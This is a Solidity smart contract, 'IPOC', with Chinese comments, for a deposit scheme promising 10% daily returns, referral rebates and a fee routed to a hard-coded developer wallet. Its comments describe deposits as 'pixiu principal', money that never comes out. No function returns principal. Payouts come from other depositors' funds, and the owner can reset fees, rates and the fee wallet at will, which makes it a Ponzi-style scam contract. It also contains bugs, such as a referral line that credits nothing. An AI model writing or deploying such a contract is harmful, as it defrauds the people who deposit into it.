/// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;
import './Ownable.sol';

contract IPOC is Ownable {
    mapping(address => uint256) private _userPosition; // 仓位(计息金额(貔貅的本金))
    mapping(address => uint256) private _userIntersetRate; // 当前利率
    mapping(address => uint256) private _userDepositTime; // 最后入金时间戳
    mapping(address => uint256) private _userEarendInterset; // 已归档收益
    mapping(address => uint256) private _userInvitationRewards;

    uint256 private DECIMAL = 1e10;

    address private _devWallet; // 收税钱包

    uint256 private _devFee = 5 * DECIMAL / 100; // 项目方税率
    uint256 private _refRate = 10 * DECIMAL / 100; // 邀请返利比例
    uint256 private _defaultDailyAPR = 10 * DECIMAL / 100 ; // 默认日利率
    uint256 private _defaultInterstRatePerSecond;
    bool private isLaunched = false;
    constructor(){
        _defaultInterstRatePerSecond = _defaultDailyAPR / 86400;
        _devWallet = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    }
    
    

    // public write functions
    // 入金/加仓  (判断ref仓位)
    function deposit(address ref) public payable{
        require(isLaunched, 'Not launched yet');
        require(msg.value != 0, 'No deposit value found');
        require(_userPosition[msg.sender] == 0, 'Each wallet can only participate once.');
        //msg.value  wei;
        uint256 value = msg.value;
        uint256 devFee = value * _devFee / DECIMAL;
        uint256 refReward = value * _refRate / DECIMAL;

        payable(_devWallet).transfer(devFee);
        
        if (ref != address(0)){
            // if(_userPosition[msg.sender] == 0) {
            if(_userPosition[ref] > 0){
                _userInvitationRewards[ref] + refReward;
            }
            // }
            // else if(_userPosition[msg.sender] / value > 10){
            //     _incrIntersetRate(msg.sender);
            // }
        }

        // if(_userPosition[msg.sender] > 0){
        //     _calcInterset(msg.sender);
        // }

        _userPosition[msg.sender] += value;
        _userDepositTime[msg.sender] = block.timestamp;
        _userIntersetRate[msg.sender] = _defaultDailyAPR;
    }

    // 收益复投
    function intersetToPosition() public {
        require(isLaunched, 'Not launched yet');
        require(_userPosition[msg.sender] > 0, 'No positions held by this address.');
        _calcInterset(msg.sender);
        require(_userEarendInterset[msg.sender] > 0, 'No earned intersets.');

        uint256 interset = _userEarendInterset[msg.sender];
        uint256 devFee = interset / 10;
        interset -= devFee;
        payable(_devWallet).transfer(devFee);

        if (_userPosition[msg.sender] / _userEarendInterset[msg.sender] >= 10){
            _incrIntersetRate(msg.sender);
        }
        _userPosition[msg.sender] += interset;
        _userEarendInterset[msg.sender] = 0;
        // require()
    }

    // 提现收益
    function withdraw() public{
        require(isLaunched, 'Not launched yet');
        require(_userPosition[msg.sender] > 0, 'No positions held by this address.');
        _calcInterset(msg.sender);
        require(_userEarendInterset[msg.sender] > 0, 'No earned intersets.');
        uint256 interset = _userEarendInterset[msg.sender];
        _userEarendInterset[msg.sender] = 0;
        payable(msg.sender).transfer(interset);
        _decrIntersetRate(msg.sender);
    }

    // 提现返利
    function withdrawInvitationRewards() public{
        require(isLaunched, 'Not launched yet');
        require(_userPosition[msg.sender] > 0, 'No positions held by this address.');
        require(_userInvitationRewards[msg.sender] > 0, 'No invitation rewards held by this address.');
        uint256 rewards = _userInvitationRewards[msg.sender];
        _userInvitationRewards[msg.sender] = 0;
        payable(msg.sender).transfer(rewards);
    }

    // public read functions


    function timestamp() public view returns(uint256){
        return block.timestamp;
    }
    // 获取计息金额
    function getPosition(address user) public view returns(uint256){
        return _userPosition[user];
    }

    // 读取当前可提现金额
    function getWithdrawableAmount(address user) public view returns(uint256){
        uint256 intersetPeriod = block.timestamp - _userDepositTime[user];
        uint256 estimateInterset = _userPosition[user] * _defaultInterstRatePerSecond * intersetPeriod / DECIMAL;
        return estimateInterset;
    }

    // 读取当前利率
    function getIntersetRate(address user) public view returns(uint256){
        return _userIntersetRate[user];
    }

    // 读取返利余额
    function getInvitationRewards(address user) public view returns(uint256){
        return _userInvitationRewards[user];
    }

    // owner functions
    function launch() public onlyOwner{
        require(_devWallet != address(0), '???');
        isLaunched = true;
    }

    function setDevFee(uint256 rate) public onlyOwner{
        _devFee = rate * DECIMAL / 100; 
    }

    function setRefRate(uint256 rate) public onlyOwner{
        _refRate = rate * DECIMAL / 100;
    }

    function setDevWallet(address wallet) public onlyOwner{
        _devWallet = wallet;
    }

    function setAPR(uint256 rate) public onlyOwner{
        _defaultDailyAPR = rate * DECIMAL / 100;
        _defaultInterstRatePerSecond = _defaultDailyAPR / 86400;
    }

    // internal functions
    function _calcInterset(address user) internal {
        // uint256 intersetPeriod = block.timestamp - _userDepositTime[user];
        // uint256 earnedInterset = _userPosition[user] * _defaultInterstRatePerSecond * intersetPeriod / DECIMAL;
        uint256 earnedInterset = getWithdrawableAmount(user);
        _userEarendInterset[user] += earnedInterset;
        _userDepositTime[msg.sender] = block.timestamp;
    }

    function _incrIntersetRate(address user) internal{
        uint256 newIntersetRate = _userIntersetRate[user] * 102 / 100;
        _userIntersetRate[user] = newIntersetRate;
    }

    function _decrIntersetRate(address user) internal {
        uint256 newIntersetRate = _userIntersetRate[user] * 80 / 100;
        _userIntersetRate[user] = newIntersetRate;
    }
}